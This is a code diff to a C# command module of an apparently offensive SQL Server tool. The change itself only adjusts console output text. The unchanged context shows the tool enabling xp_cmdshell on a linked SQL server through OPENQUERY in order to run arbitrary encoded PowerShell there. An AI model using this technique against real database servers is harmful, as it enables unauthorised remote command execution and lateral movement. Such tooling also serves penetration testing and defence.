@@ -11,7 +11,7 @@ namespace SharpSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'");
+            Console.WriteLine("[*] Action: Execute Arbitrary Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY':");
             Console.WriteLine("\tUsage: SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
@@ -110,7 +110,7 @@ namespace SharpSQL.Commands
             SqlCommand command = new SqlCommand(enableAdvOptions, connection);
             SqlDataReader reader = command.ExecuteReader();
             reader.Read();
-            Console.WriteLine("[*] Enabling Advanced options..");
+            Console.WriteLine("\n[*] Enabling Advanced options..");
             reader.Close();
 
             string enableXP = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";
